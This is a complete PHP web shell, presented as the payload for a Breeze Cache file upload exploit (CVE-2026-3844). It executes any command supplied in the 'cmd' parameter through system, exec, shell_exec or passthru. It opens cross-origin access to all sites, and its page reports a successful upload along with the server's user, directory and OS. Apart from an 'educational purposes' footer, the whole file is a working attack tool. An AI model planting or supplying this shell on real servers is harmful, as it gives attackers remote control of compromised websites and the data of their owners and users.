<?php
// CVE-2026-3844 Web Shell
// Usage: shell.php?cmd=whoami

// Allow from any origin (CORS)
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST");
header("Content-Type: text/html; charset=UTF-8");

// Function to execute commands
function execute_command($cmd) {
    // Try different execution methods
    if (function_exists('system')) {
        ob_start();
        system($cmd);
        return ob_get_clean();
    } elseif (function_exists('exec')) {
        return exec($cmd);
    } elseif (function_exists('shell_exec')) {
        return shell_exec($cmd);
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        return ob_get_clean();
    } else {
        return "Error: No execution function available";
    }
}

// Get command from GET or POST
$cmd = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : '';

// Display info page if no command
if (empty($cmd)) {
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>CVE-2026-3844 Web Shell</title>
        <style>
            body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
            h1 { color: #4ec9b0; }
            form { margin: 20px 0; }
            input[type="text"] { width: 70%; padding: 10px; background: #3c3c3c; border: none; color: white; font-size: 14px; }
            button { padding: 10px 20px; background: #0e639c; border: none; color: white; cursor: pointer; }
            button:hover { background: #1177bb; }
            .info { background: #2d2d2d; padding: 10px; border-left: 3px solid #4ec9b0; margin: 10px 0; }
            pre { background: #2d2d2d; padding: 15px; overflow-x: auto; border: 1px solid #3c3c3c; }
            .success { color: #4ec9b0; }
            .warning { color: #ce9178; }
        </style>
    </head>
    <body>
        <h1>🐚 CVE-2026-3844 Web Shell</h1>
        <div class="info">
            <span class="success">✓</span> Web Shell uploaded successfully!<br>
            <span class="warning">⚠</span> Use ?cmd=command to execute commands
        </div>
        <form method="GET" action="">
            <input type="text" name="cmd" placeholder="Enter command (e.g., whoami, id, ls -la)" autocomplete="off">
            <button type="submit">Execute</button>
        </form>
        <div class="info">
            <strong>📁 Current Directory:</strong> ' . __DIR__ . '<br>
            <strong>👤 Current User:</strong> ' . execute_command("whoami 2>/dev/null || id") . '<br>
            <strong>🐧 Server OS:</strong> ' . php_uname() . '
        </div>
        <hr>
        <small>CVE-2026-3844 - Breeze Cache File Upload Exploit | For Educational Purposes Only</small>
    </body>
    </html>';
    exit;
}

// Execute command and display result
echo '<!DOCTYPE html>
<html>
<head>
    <title>Command Output</title>
    <style>
        body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
        a { color: #4ec9b0; text-decoration: none; }
        pre { background: #2d2d2d; padding: 15px; overflow-x: auto; border-left: 3px solid #4ec9b0; }
        .back { margin-top: 20px; }
    </style>
</head>
<body>
    <h2>💰 Command: ' . htmlspecialchars($cmd) . '</h2>
    <pre>' . htmlspecialchars(execute_command($cmd)) . '</pre>
    <div class="back"><a href="?">&larr; Back to Shell</a></div>
</body>
</html>';
?>
